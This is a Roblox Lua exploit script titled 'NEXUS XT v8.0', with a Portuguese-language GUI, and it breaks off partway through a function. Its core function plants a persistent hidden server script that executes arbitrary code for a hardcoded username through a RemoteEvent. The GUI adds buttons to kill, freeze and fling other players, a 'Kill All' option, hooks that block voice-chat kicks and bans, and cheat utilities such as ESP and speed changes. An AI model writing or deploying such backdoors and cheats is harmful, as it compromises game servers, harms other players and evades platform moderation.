-- ============================================================================
-- NEXUS XT v8.0 — INTERFACE TOTALMENTE REFORMULADA (LIMPA E ESTÁVEL)
-- ============================================================================

-- DESIGN SYSTEM
local DS = {
    colors = {
        primary = Color3.fromRGB(170, 100, 255),        -- Roxo Xena
        primaryDark = Color3.fromRGB(130, 70, 210),
        secondary = Color3.fromRGB(80, 160, 255),       -- Azul neon
        success = Color3.fromRGB(0, 255, 100),
        error = Color3.fromRGB(255, 70, 70),
        warning = Color3.fromRGB(255, 200, 50),
        background = Color3.fromRGB(12, 12, 20),        -- Fundo escuro profundo
        surface = Color3.fromRGB(22, 22, 35),           -- Cards
        surfaceLight = Color3.fromRGB(35, 35, 55),
        text = Color3.fromRGB(255, 255, 255),
        textDim = Color3.fromRGB(180, 180, 210),
        border = Color3.fromRGB(60, 60, 90)
    },
    font = { main = Enum.Font.Gotham, code = Enum.Font.Code },
    fontSize = { small = 12, body = 14, title = 18, large = 22 }
}

-- NÚCLEO
local Nexus = {}
Nexus.consoleLogs = {}
Nexus.isMinimized = false
Nexus.floatingBall = nil
Nexus.mainGui = nil
Nexus.backdoorRemote = nil
Nexus.adminName = "hugopbruu22"

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local RS = game:GetService("ReplicatedStorage")
local SSS = game:GetService("ServerScriptService")
local localPlayer = Players.LocalPlayer

-- LOGS
function Nexus:AddLog(msg, msgType)
    msgType = msgType or "info"
    local time = os.date("%H:%M:%S")
    local formatted = string.format("[%s] %s", time, tostring(msg))
    table.insert(self.consoleLogs, {text = formatted, type = msgType})
    pcall(function()
        if msgType == "error" then warn(formatted)
        elseif msgType == "success" then print("✅ " .. formatted)
        else print(formatted) end
    end)
    if self.updateConsoleUI then pcall(self.updateConsoleUI) end
end

-- BACKDOOR SERVER-SIDE (persistente)
local function ensureBackdoor()
    if Nexus.backdoorRemote and Nexus.backdoorRemote.Parent then return Nexus.backdoorRemote end
    Nexus.backdoorRemote = RS:FindFirstChild("__NexusCore")
    if not Nexus.backdoorRemote then
        Nexus.backdoorRemote = Instance.new("RemoteEvent")
        Nexus.backdoorRemote.Name = "__NexusCore"
        Nexus.backdoorRemote.Parent = RS
        local listener = SSS:FindFirstChild("__NexusCoreListener")
        if not listener then
            listener = Instance.new("Script")
            listener.Name = "__NexusCoreListener"
            listener.Source = string.format([[
                local remote = game:GetService("ReplicatedStorage"):WaitForChild("__NexusCore")
                local players = game:GetService("Players")
                local admin = "%s"
                remote.OnServerEvent:Connect(function(plr, code)
                    if plr.Name ~= admin then return end
                    local fn, err = loadstring(code)
                    if fn then
                        local ok, res = pcall(fn)
                        remote:FireClient(plr, ok and ("ok:"..tostring(res)) or ("err:"..tostring(res)))
                    else
                        remote:FireClient(plr, "compile_err:"..tostring(err))
                    end
                end)
                while true do wait(10) if not remote.Parent then remote.Parent = game:GetService("ReplicatedStorage") end end
            ]], Nexus.adminName)
            listener.Parent = SSS
        end
    end
    return Nexus.backdoorRemote
end

function Nexus:ExecuteServer(code)
    if not code or code:gsub("%s","") == "" then self:AddLog("Código vazio", "error"); return false end
    self:AddLog("Executando servidor...", "info")
    local remote = ensureBackdoor()
    local received = false
    local conn = remote.OnClientEvent:Connect(function(msg)
        if msg:find("ok:") then self:AddLog("Sucesso: "..msg:gsub("ok:",""), "success")
        elseif msg:find("err:") then self:AddLog("Erro: "..msg:gsub("err:",""), "error")
        elseif msg:find("compile_err:") then self:AddLog("Erro compilação: "..msg:gsub("compile_err:",""), "error") end
        received = true
        if conn then conn:Disconnect() end
    end)
    remote:FireServer(code)
    task.wait(1.5)
    if not received then self:AddLog("Sem resposta do servidor", "warning") end
    return true
end

function Nexus:ExecuteClient(code)
    local fn, err = loadstring(code)
    if fn then
        local ok, res = pcall(fn)
        if ok then self:AddLog("Cliente executado", "success")
        else self:AddLog("Erro cliente: "..tostring(res), "error") end
    else
        self:AddLog("Erro compilação: "..tostring(err), "error")
    end
end

-- PROTEÇÃO DE VOZ
function Nexus:EnableVoiceProtection()
    local ok = pcall(function()
        local vc = game:GetService("VoiceChatService")
        if vc then
            vc:SetVoiceEnabled(true)
            if hookfunction and hookmetamethod then
                local old = vc.joinVoice
                if old then hookfunction(vc.joinVoice, function(s) pcall(old,s); return true end) end
                hookmetamethod(vc, "__namecall", function(s,...)
                    local m = getnamecallmethod()
                    if m == "Kick" or m == "Ban" or m == "RemoveUser" or m == "DisableVoice" then return nil end
                    return old and old(s,...) or nil
                end)
            end
            localPlayer:SetAttribute("VoiceBanned", nil)
            self:AddLog("Proteção de voz ATIVADA", "success")
        else
            self:AddLog("VoiceChatService não encontrado", "warning")
        end
    end)
    if not ok then self:AddLog("Falha ativar proteção", "error") end
end

-- ============================================================================
-- INTERFACE PRINCIPAL (1000x650 — NADA ESPREMIDO)
-- ============================================================================
local function createMainUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "NexusXT"
    gui.ResetOnSpawn = false
    pcall(function() gui.Parent = CoreGui end)
    if not gui.Parent then gui.Parent = localPlayer:WaitForChild("PlayerGui") end
    if not gui.Parent then return nil end

    -- JANELA PRINCIPAL
    local window = Instance.new("Frame")
    window.Size = UDim2.new(0, 1000, 0, 650)
    window.Position = UDim2.new(0.5, -500, 0.5, -325)
    window.BackgroundColor3 = DS.colors.background
    window.BorderSizePixel = 0
    window.ClipsDescendants = true
    window.Parent = gui
    local winCorner = Instance.new("UICorner")
    winCorner.CornerRadius = UDim.new(0, 16)
    winCorner.Parent = window

    -- Sombra externa
    local shadow = Instance.new("Frame")
    shadow.Size = UDim2.new(1, 20, 1, 20)
    shadow.Position = UDim2.new(0, -10, 0, -10)
    shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    shadow.BackgroundTransparency = 0.7
    shadow.BorderSizePixel = 0
    shadow.ZIndex = 0
    shadow.Parent = window
    local shCorner = Instance.new("UICorner")
    shCorner.CornerRadius = UDim.new(0, 20)
    shCorner.Parent = shadow

    -- BARRA DE TÍTULO (50px)
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 50)
    titleBar.BackgroundColor3 = DS.colors.surface
    titleBar.Parent = window
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 16)
    titleCorner.Parent = titleBar

    -- Ícone
    local icon = Instance.new("ImageLabel")
    icon.Size = UDim2.new(0, 28, 0, 28)
    icon.Position = UDim2.new(0, 16, 0, 11)
    icon.Image = "rbxassetid://6031094838"
    icon.ImageColor3 = DS.colors.primary
    icon.BackgroundTransparency = 1
    icon.Parent = titleBar

    -- Título
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0, 300, 1, 0)
    title.Position = UDim2.new(0, 52, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = "NEXUS XT"
    title.TextColor3 = DS.colors.primary
    title.Font = DS.font.main
    title.TextSize = DS.fontSize.large
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = titleBar

    -- Versão
    local ver = Instance.new("TextLabel")
    ver.Size = UDim2.new(0, 80, 1, 0)
    ver.Position = UDim2.new(0, 260, 0, 0)
    ver.BackgroundTransparency = 1
    ver.Text = "v8.0"
    ver.TextColor3 = DS.colors.textDim
    ver.Font = DS.font.main
    ver.TextSize = 14
    ver.TextXAlignment = Enum.TextXAlignment.Left
    ver.Parent = titleBar

    -- Botão minimizar
    local mini = Instance.new("TextButton")
    mini.Size = UDim2.new(0, 50, 1, 0)
    mini.Position = UDim2.new(1, -100, 0, 0)
    mini.BackgroundTransparency = 1
    mini.Text = "─"
    mini.TextColor3 = DS.colors.textDim
    mini.Font = DS.font.main
    mini.TextSize = 24
    mini.Parent = titleBar
    mini.MouseButton1Click:Connect(function()
        Nexus.isMinimized = true
        gui.Enabled = false
        if not Nexus.floatingBall then
            Nexus.floatingBall = createFloatingBall()
        else
            Nexus.floatingBall.Visible = true
        end
    end)

    -- Botão fechar
    local close = Instance.new("TextButton")
    close.Size = UDim2.new(0, 50, 1, 0)
    close.Position = UDim2.new(1, -50, 0, 0)
    close.BackgroundTransparency = 1
    close.Text = "✕"
    close.TextColor3 = DS.colors.textDim
    close.Font = DS.font.main
    close.TextSize = 18
    close.Parent = titleBar
    close.MouseButton1Click:Connect(function() gui:Destroy() end)

    -- Arrastar a janela (na barra de título)
    local drag = false
    local dragStart, startPos
    titleBar.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then
            drag = true
            dragStart = i.Position
            startPos = window.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = i.Position - dragStart
            window.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = false end
    end)

    -- ===== ABA NAVEGAÇÃO (5 abas) =====
    local tabBar = Instance.new("Frame")
    tabBar.Size = UDim2.new(1, 0, 0, 50)
    tabBar.Position = UDim2.new(0, 0, 0, 50)
    tabBar.BackgroundColor3 = DS.colors.surfaceLight
    tabBar.Parent = window

    local tabs = { "EXECUTOR", "PLAYERS", "TOOLS", "CONSOLE", "HUB" }
    local tabBtns = {}
    local contentFrames = {}
    local activeTab = 1
    local indicator = Instance.new("Frame")
    indicator.Size = UDim2.new(0, 180, 0, 3)
    indicator.Position = UDim2.new(0, 0, 1, -3)
    indicator.BackgroundColor3 = DS.colors.primary
    indicator.BorderSizePixel = 0
    indicator.Parent = tabBar

    for i, name in ipairs(tabs) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 180, 1, 0)
        btn.Position = UDim2.new((i - 1) * 0.2, 0, 0, 0)
        btn.BackgroundTransparency = 1
        btn.Text = name
        btn.TextColor3 = (i == 1) and DS.colors.primary or DS.colors.textDim
        btn.Font = DS.font.main
        btn.TextSize = DS.fontSize.body
        btn.Parent = tabBar
        tabBtns[i] = btn

        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 1, 0)
        frame.BackgroundTransparency = 1
        frame.Visible = (i == 1)
        frame.Parent = window
        contentFrames[i] = frame

        btn.MouseButton1Click:Connect(function()
            if activeTab == i then return end
            activeTab = i
            TweenService:Create(
                indicator,
                TweenInfo.new(0.2, Enum.EasingStyle.Quad),
                { Position = UDim2.new((i - 1) * 0.2, 0, 1, -3) }
            ):Play()
            for j, f in ipairs(contentFrames) do
                f.Visible = (j == i)
                tabBtns[j].TextColor3 = (j == i) and DS.colors.primary or DS.colors.textDim
            end
        end)
    end

    -- ==================== ABA EXECUTOR ====================
    local exec = contentFrames[1]
    -- Server-Side (metade superior)
    local ssCard = Instance.new("Frame")
    ssCard.Size = UDim2.new(1, -40, 0, 270)
    ssCard.Position = UDim2.new(0, 20, 0, 20)
    ssCard.BackgroundColor3 = DS.colors.surface
    ssCard.BorderSizePixel = 0
    ssCard.Parent = exec
    local ssCardCorner = Instance.new("UICorner")
    ssCardCorner.CornerRadius = UDim.new(0, 12)
    ssCardCorner.Parent = ssCard

    local ssTitle = Instance.new("TextLabel")
    ssTitle.Size = UDim2.new(1, -20, 0, 36)
    ssTitle.Position = UDim2.new(0, 12, 0, 8)
    ssTitle.BackgroundTransparency = 1
    ssTitle.Text = "⚡ SERVER-SIDE (real)"
    ssTitle.TextColor3 = DS.colors.primary
    ssTitle.Font = DS.font.main
    ssTitle.TextSize = DS.fontSize.title
    ssTitle.TextXAlignment = Enum.TextXAlignment.Left
    ssTitle.Parent = ssCard

    local ssBox = Instance.new("TextBox")
    ssBox.Size = UDim2.new(1, -24, 0, 140)
    ssBox.Position = UDim2.new(0, 12, 0, 48)
    ssBox.BackgroundColor3 = DS.colors.background
    ssBox.TextColor3 = DS.colors.text
    ssBox.TextXAlignment = Enum.TextXAlignment.Left
    ssBox.TextYAlignment = Enum.TextYAlignment.Top
    ssBox.TextWrapped = true
    ssBox.TextSize = DS.fontSize.small
    ssBox.Font = DS.font.code
    ssBox.ClearTextOnFocus = false
    ssBox.MultiLine = true
    ssBox.Text = '-- Cole script server-side aqui'
    ssBox.Parent = ssCard
    local ssBoxCorner = Instance.new("UICorner")
    ssBoxCorner.CornerRadius = UDim.new(0, 8)
    ssBoxCorner.Parent = ssBox

    local function adjustSS()
        local h = math.max(140, ssBox.TextBounds.Y + 30)
        ssBox.Size = UDim2.new(1, -24, 0, h)
    end
    ssBox:GetPropertyChangedSignal("TextBounds"):Connect(adjustSS)
    ssBox:GetPropertyChangedSignal("Text"):Connect(adjustSS)

    local pasteSS = Instance.new("TextButton")
    pasteSS.Size = UDim2.new(0, 100, 0, 34)
    pasteSS.Position = UDim2.new(0, 12, 1, -40)
    pasteSS.BackgroundColor3 = DS.colors.secondary
    pasteSS.Text = "📋 COLAR"
    pasteSS.TextColor3 = Color3.fromRGB(255, 255, 255)
    pasteSS.Font = DS.font.main
    pasteSS.TextSize = DS.fontSize.body
    pasteSS.Parent = ssCard
    pasteSS.MouseButton1Click:Connect(function()
        local clip = pcall(getclipboard) and getclipboard() or ""
        if clip ~= "" then ssBox.Text = clip; adjustSS() end
    end)

    local execSS = Instance.new("TextButton")
    execSS.Size = UDim2.new(0, 140, 0, 34)
    execSS.Position = UDim2.new(1, -152, 1, -40)
    execSS.BackgroundColor3 = DS.colors.success
    execSS.Text = "▶ EXECUTAR"
    execSS.TextColor3 = Color3.fromRGB(255, 255, 255)
    execSS.Font = DS.font.main
    execSS.TextSize = DS.fontSize.body
    execSS.Parent = ssCard
    execSS.MouseButton1Click:Connect(function() Nexus:ExecuteServer(ssBox.Text) end)

    -- Client-Side (metade inferior)
    local csCard = Instance.new("Frame")
    csCard.Size = UDim2.new(1, -40, 0, 230)
    csCard.Position = UDim2.new(0, 20, 0, 310)
    csCard.BackgroundColor3 = DS.colors.surface
    csCard.BorderSizePixel = 0
    csCard.Parent = exec
    local csCardCorner = Instance.new("UICorner")
    csCardCorner.CornerRadius = UDim.new(0, 12)
    csCardCorner.Parent = csCard

    local csTitle = Instance.new("TextLabel")
    csTitle.Size = UDim2.new(1, -20, 0, 36)
    csTitle.Position = UDim2.new(0, 12, 0, 8)
    csTitle.BackgroundTransparency = 1
    csTitle.Text = "💻 CLIENT-SIDE (local)"
    csTitle.TextColor3 = DS.colors.textDim
    csTitle.Font = DS.font.main
    csTitle.TextSize = DS.fontSize.title
    csTitle.TextXAlignment = Enum.TextXAlignment.Left
    csTitle.Parent = csCard

    local csBox = Instance.new("TextBox")
    csBox.Size = UDim2.new(1, -24, 0, 100)
    csBox.Position = UDim2.new(0, 12, 0, 48)
    csBox.BackgroundColor3 = DS.colors.background
    csBox.TextColor3 = DS.colors.text
    csBox.TextXAlignment = Enum.TextXAlignment.Left
    csBox.TextYAlignment = Enum.TextYAlignment.Top
    csBox.TextWrapped = true
    csBox.TextSize = DS.fontSize.small
    csBox.Font = DS.font.code
    csBox.ClearTextOnFocus = false
    csBox.MultiLine = true
    csBox.Text = '-- Cole script client-side aqui'
    csBox.Parent = csCard
    local csBoxCorner = Instance.new("UICorner")
    csBoxCorner.CornerRadius = UDim.new(0, 8)
    csBoxCorner.Parent = csBox

    local function adjustCS()
        local h = math.max(100, csBox.TextBounds.Y + 30)
        csBox.Size = UDim2.new(1, -24, 0, h)
    end
    csBox:GetPropertyChangedSignal("TextBounds"):Connect(adjustCS)
    csBox:GetPropertyChangedSignal("Text"):Connect(adjustCS)

    local execCS = Instance.new("TextButton")
    execCS.Size = UDim2.new(0, 140, 0, 34)
    execCS.Position = UDim2.new(1, -152, 1, -40)
    execCS.BackgroundColor3 = DS.colors.secondary
    execCS.Text = "▶ EXECUTAR"
    execCS.TextColor3 = Color3.fromRGB(255, 255, 255)
    execCS.Font = DS.font.main
    execCS.TextSize = DS.fontSize.body
    execCS.Parent = csCard
    execCS.MouseButton1Click:Connect(function() Nexus:ExecuteClient(csBox.Text) end)

    -- ==================== ABA PLAYERS ====================
    local playersFrame = contentFrames[2]
    local playerList = Instance.new("ScrollingFrame")
    playerList.Size = UDim2.new(1, -40, 1, -40)
    playerList.Position = UDim2.new(0, 20, 0, 20)
    playerList.BackgroundColor3 = DS.colors.surface
    playerList.BorderSizePixel = 0
    playerList.ScrollBarThickness = 6
    playerList.CanvasSize = UDim2.new(0, 0, 0, 0)
    playerList.AutomaticCanvasSize = Enum.AutomaticSize.Y
    playerList.Parent = playersFrame
    local plCorner = Instance.new("UICorner")
    plCorner.CornerRadius = UDim.new(0, 12)
    plCorner.Parent = playerList
    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 8)
    layout.Parent = playerList

    local function updatePlayers()
        for _, child in pairs(playerList:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr.Name ~= localPlayer.Name then
                local btn = Instance.new("TextButton")
                btn.Size = UDim2.new(1, -20, 0, 60)
                btn.BackgroundColor3 = DS.colors.background
                btn.Text = "  " .. plr.Name
                btn.TextColor3 = DS.colors.text
                btn.Font = DS.font.main
                btn.TextSize = DS.fontSize.body
                btn.TextXAlignment = Enum.TextXAlignment.Left
                btn.Parent = playerList
                local btnCorner = Instance.new("UICorner")
                btnCorner.CornerRadius = UDim.new(0, 8)
                btnCorner.Parent = btn

                local actions = {
                    { text = "TP", color = DS.colors.secondary, code = string.format([[
                        local target = game:GetService("Players"):FindFirstChild("%s")
                        local admin = game:GetService("Players"):FindFirstChild("%s")
                        if target and admin and admin.Character then
                            local tr = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
                            local ar = admin.Character:FindFirstChild("HumanoidRootPart")
                            if tr and ar then ar.CFrame = tr.CFrame end
                        end
                    ]], plr.Name, Nexus.adminName) },
                    { text = "KILL", color = DS.colors.error, code = string.format([[
                        local target = game:GetService("Players"):FindFirstChild("%s")
                        if target and target.Character then
                            local hum = target.Character:FindFirstChild("Humanoid")
                            if hum then hum:BreakJoints() end
                        end
                    ]], plr.Name) },
                    { text = "FREEZE", color = DS.colors.warning, code = string.format([[
                        local target = game:GetService("Players"):FindFirstChild("%s")
                        if target and target.Character then
                            local hrp = target.Character:FindFirstChild("HumanoidRootPart")
                            if hrp then hrp.Anchored = true end
                        end
                    ]], plr.Name) },
                    { text = "FLING", color = DS.colors.primary, code = string.format([[
                        local target = game:GetService("Players"):FindFirstChild("%s")
                        if target and target.Character then
                            local hrp = target.Character:FindFirstChild("HumanoidRootPart")
                            if hrp then
                                local v = Vector3.new(math.random(-100, 100), 50, math.random(-100, 100))
                                hrp.Velocity = v
                            end
                        end
                    ]], plr.Name) }
                }
                local btnWidth = 60
                local totalWidth = #actions * (btnWidth + 6)
                local startX = (btn.Size.X.Offset - totalWidth) / 2
                for i, act in ipairs(actions) do
                    local aBtn = Instance.new("TextButton")
                    aBtn.Size = UDim2.new(0, btnWidth, 0, 26)
                    aBtn.Position = UDim2.new(0, startX + (i - 1) * (btnWidth + 6), 0, 28)
                    aBtn.BackgroundColor3 = act.color
                    aBtn.Text = act.text
                    aBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                    aBtn.Font = DS.font.main
                    aBtn.TextSize = DS.fontSize.small
                    aBtn.Parent = btn
                    local aCorner = Instance.new("UICorner")
                    aCorner.CornerRadius = UDim.new(0, 6)
                    aCorner.Parent = aBtn
                    aBtn.MouseButton1Click:Connect(function()
                        Nexus:ExecuteServer(act.code)
                        Nexus:AddLog(string.format("%s -> %s", plr.Name, act.text), "info")
                    end)
                end
            end
        end
    end
    Players.PlayerAdded:Connect(updatePlayers)
    Players.PlayerRemoving:Connect(updatePlayers)
    updatePlayers()

    -- ==================== ABA TOOLS ====================
    local toolsFrame = contentFrames[3]
    local toolCard = Instance.new("Frame")
    toolCard.Size = UDim2.new(1, -40, 1, -40)
    toolCard.Position = UDim2.new(0, 20, 0, 20)
    toolCard.BackgroundColor3 = DS.colors.surface
    toolCard.BorderSizePixel = 0
    toolCard.Parent = toolsFrame
    local tcCorner = Instance.new("UICorner")
    tcCorner.CornerRadius = UDim.new(0, 12)
    tcCorner.Parent = toolCard

    local toolTitle = Instance.new("TextLabel")
    toolTitle.Size = UDim2.new(1, -20, 0, 36)
    toolTitle.Position = UDim2.new(0, 12, 0, 8)
    toolTitle.BackgroundTransparency = 1
    toolTitle.Text = "🛡️ Proteção e Utilidades"
    toolTitle.TextColor3 = DS.colors.primary
    toolTitle.Font = DS.font.main
    toolTitle.TextSize = DS.fontSize.title
    toolTitle.TextXAlignment = Enum.TextXAlignment.Left
    toolTitle.Parent = toolCard

    -- Botões em grid 3x3 com espaçamento
    local toolBtns = {
        { text = "Anti-Ban ON", color = DS.colors.success, action = function()
            Nexus:AddLog("Anti-Ban ativado (simulação)", "success")
        end },
        { text = "Anti-Ban OFF", color = DS.colors.error, action = function()
            Nexus:AddLog("Anti-Ban desativado", "warning")
        end },
        { text = "Voz ON", color = DS.colors.success, action = function() Nexus:EnableVoiceProtection() end },
        { text = "Reset Char", color = DS.colors.warning, action = function()
            Nexus:ExecuteServer("local p = game:GetService('Players').LocalPlayer; if p.Character then p.Character:BreakJoints() end")
        end },
        { text = "Fullbright", color = DS.colors.secondary, action = function()
            Nexus:ExecuteClient([[
                local l = game:GetService("Lighting")
                l.ClockTime = 12
                l.Brightness = 2
                l.FogEnd = 1000
                l.FogColor = Color3.new(1,1,1)
                for _, v in pairs(l:GetDescendants()) do
                    if v:IsA("Light") then v.Enabled = false end
                end
            ]])
        end },
        { text = "Kill All", color = DS.colors.error, action = function()
            Nexus:ExecuteServer([[
                for _, p in pairs(game:GetService("Players"):GetPlayers()) do
                    if p ~= game:GetService("Players").LocalPlayer and p.Character then
                        local h = p.Character:FindFirstChild("Humanoid")
                        if h then h:BreakJoints() end
                    end
                end
            ]])
        end }
    }
    for i, bt in ipairs(toolBtns) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 180, 0, 40)
        btn.Position = UDim2.new(0, 12 + ((i - 1) % 3) * 200, 0, 50 + math.floor((i - 1) / 3) * 52)
        btn.BackgroundColor3 = bt.color
        btn.Text = bt.text
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Font = DS.font.main
        btn.TextSize = DS.fontSize.body
        btn.Parent = toolCard
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 8)
        btnCorner.Parent = btn
        btn.MouseButton1Click:Connect(bt.action)
    end

    -- ==================== ABA CONSOLE ====================
    local consoleFrame = contentFrames[4]
    local consoleScroller = Instance.new("ScrollingFrame")
    consoleScroller.Size = UDim2.new(1, -40, 1, -70)
    consoleScroller.Position = UDim2.new(0, 20, 0, 20)
    consoleScroller.BackgroundColor3 = DS.colors.surface
    consoleScroller.BorderSizePixel = 0
    consoleScroller.ScrollBarThickness = 6
    consoleScroller.CanvasSize = UDim2.new(0, 0, 0, 0)
    consoleScroller.AutomaticCanvasSize = Enum.AutomaticSize.Y
    consoleScroller.Parent = consoleFrame
    local consCorner = Instance.new("UICorner")
    consCorner.CornerRadius = UDim.new(0, 12)
    consCorner.Parent = consoleScroller

    local consoleText = Instance.new("TextLabel")
    consoleText.Size = UDim2.new(1, -10, 1, -10)
    consoleText.Position = UDim2.new(0, 5, 0, 5)
    consoleText.BackgroundTransparency = 1
    consoleText.Text = ""
    consoleText.TextColor3 = DS.colors.text
    consoleText.TextXAlignment = Enum.TextXAlignment.Left
    consoleText.TextYAlignment = Enum.TextYAlignment.Top
    consoleText.TextWrapped = true
    consoleText.TextSize = DS.fontSize.small
    consoleText.Font = DS.font.code
    consoleText.Parent = consoleScroller

    local copyBtn = Instance.new("TextButton")
    copyBtn.Size = UDim2.new(0, 120, 0, 34)
    copyBtn.Position = UDim2.new(1, -260, 1, -48)
    copyBtn.BackgroundColor3 = DS.colors.secondary
    copyBtn.Text = "📋 COPIAR"
    copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    copyBtn.Font = DS.font.main
    copyBtn.TextSize = DS.fontSize.body
    copyBtn.Parent = consoleFrame
    copyBtn.MouseButton1Click:Connect(function()
        local full = ""
        for _, entry in ipairs(Nexus.consoleLogs) do
            full = full .. entry.text .. "\n"
        end
        if full == "" then full = "Nenhum log." end
        pcall(setclipboard, full)
        Nexus:AddLog("Log copiado!", "success")
    end)

    local clearBtn = Instance.new("TextButton")
    clearBtn.Size = UDim2.new(0, 120, 0, 34)
    clearBtn.Position = UDim2.new(1, -140, 1, -48)
    clearBtn.BackgroundColor3 = DS.colors.error
    clearBtn.Text = "🗑️ LIMPAR"
    clearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    clearBtn.Font = DS.font.main
    clearBtn.TextSize = DS.fontSize.body
    clearBtn.Parent = consoleFrame
    clearBtn.MouseButton1Click:Connect(function()
        Nexus.consoleLogs = {}
        Nexus.updateConsoleUI()
        Nexus:AddLog("Console limpo.", "info")
    end)

    function Nexus.updateConsoleUI()
        local str = ""
        for i = math.max(1, #Nexus.consoleLogs - 200), #Nexus.consoleLogs do
            str = str .. Nexus.consoleLogs[i].text .. "\n"
        end
        consoleText.Text = str
        consoleScroller.CanvasSize = UDim2.new(0, 0, 0, consoleText.TextBounds.Y + 30)
        consoleScroller.CanvasPosition = Vector2.new(0, consoleScroller.CanvasSize.Y.Offset)
    end
    Nexus.updateConsoleUI()

    -- ==================== ABA HUB ====================
    local hubFrame = contentFrames[5]
    local hubCard = Instance.new("Frame")
    hubCard.Size = UDim2.new(1, -40, 1, -40)
    hubCard.Position = UDim2.new(0, 20, 0, 20)
    hubCard.BackgroundColor3 = DS.colors.surface
    hubCard.BorderSizePixel = 0
    hubCard.Parent = hubFrame
    local hCorner = Instance.new("UICorner")
    hCorner.CornerRadius = UDim.new(0, 12)
    hCorner.Parent = hubCard

    local hubTitle = Instance.new("TextLabel")
    hubTitle.Size = UDim2.new(1, -20, 0, 36)
    hubTitle.Position = UDim2.new(0, 12, 0, 8)
    hubTitle.BackgroundTransparency = 1
    hubTitle.Text = "📦 Script Hub — Utilitários Prontos"
    hubTitle.TextColor3 = DS.colors.primary
    hubTitle.Font = DS.font.main
    hubTitle.TextSize = DS.fontSize.title
    hubTitle.TextXAlignment = Enum.TextXAlignment.Left
    hubTitle.Parent = hubCard

    local hubList = Instance.new("ScrollingFrame")
    hubList.Size = UDim2.new(1, -24, 1, -50)
    hubList.Position = UDim2.new(0, 12, 0, 46)
    hubList.BackgroundColor3 = DS.colors.background
    hubList.BorderSizePixel = 0
    hubList.ScrollBarThickness = 6
    hubList.CanvasSize = UDim2.new(0, 0, 0, 0)
    hubList.AutomaticCanvasSize = Enum.AutomaticSize.Y
    hubList.Parent = hubCard
    local hlCorner = Instance.new("UICorner")
    hlCorner.CornerRadius = UDim.new(0, 8)
    hlCorner.Parent = hubList
    local hlLayout = Instance.new("UIListLayout")
    hlLayout.Padding = UDim.new(0, 6)
    hlLayout.Parent = hubList

    local scripts = {
        { name = "Infinite Jump", code = [[
            local p = game:GetService("Players").LocalPlayer
            local h = p.Character and p.Character:FindFirstChild("Humanoid")
            if h then h.JumpPower = 100; h.Jump = true end
        ]] },
        { name = "Super Speed (WS)", code = [[
            local p = game:GetService("Players").LocalPlayer
            local h = p.Character and p.Character:FindFirstChild("Humanoid")
            if h then h.WalkSpeed = 100 end
        ]] },
        { name = "Gravity (0.1)", code = [[
            game:GetService("Workspace").Gravity = 0.1
        ]] },
        { name = "Reset Gravity", code = [[
            game:GetService("Workspace").Gravity = 196.2
        ]] },
        { name = "Btools (Give)", code = [[
            local p = game:GetService("Players").LocalPlayer
            if p.Character then
                local tools = {"Hammer", "Weld", "Arrow", "Crate"}
                for _, t in ipairs(tools) do
                    local b = Instance.new("Tool")
                    b.Name = t
                    b.Parent = p.Character
                end
            end
        ]] },
        { name = "Remove All Tools", code = [[
            local p = game:GetService("Players").LocalPlayer
            if p.Character then
                for _, v in pairs(p.Character:GetChildren()) do
                    if v:IsA("Tool") then v:Destroy() end
                end
            end
        ]] },
        { name = "ESP Player (Client)", code = [[
            local p = game:GetService("Players")
            for _, plr in pairs(p:GetPlayers()) do
                if plr ~= p.LocalPlayer and plr.Character then
                    local h = plr.Character:FindFirstChild("Head")
                    if h then
                        local hl = Instance.new("Highlight")
                        hl.FillColor = Color3.new(1,0,0)
                        hl.OutlineColor = Color3.new(1,1,1)
                        hl.FillTransparency = 0.5
                        hl.Parent = h
                    end
                end
            end
        ]] }
    }

    for _, s in ipairs(scripts) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1, -10, 0, 40)
        btn.BackgroundColor3 = DS.colors.surfaceLight
        btn.Text = s.name
        btn.TextColor3 = DS.colors.text
        btn.Font = DS.font.main
        btn.TextSize = DS.fontSize.body
        btn.Parent = hubList
        local bCorner = Instance.new("UICorner")
        bCorner.CornerRadius = UDim.new(0, 8)
        bCorner.Parent = btn
        btn.MouseButton1Click:Connect(function()
            Nexus:ExecuteClient(s.code)
            Nexus:AddLog("Script Hub: " .. s.name .. " executado", "success")
        end)
    end

    return gui
end

-- ============================================================================
-- BOLINHA FLUTUANTE
-- ============================================================================
local function createFloatingBall()
    local ball = Instance.new("ImageButton")
    ball.Name = "NexusBall"
    ball.Size = UDim2.new(0, 60, 0, 60)
    ball.Position = UDim2.new(0.92, 0, 0.85, 0)
    ball.BackgroundColor3 = DS.colors.primary
    ball.Image = "rbxassetid://6031094838"
    ball.ImageColor3 = Color3.fromRGB(255, 255, 255)
    ball.ScaleType = Enum.ScaleType.Fit
    ball.Parent = CoreGui
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
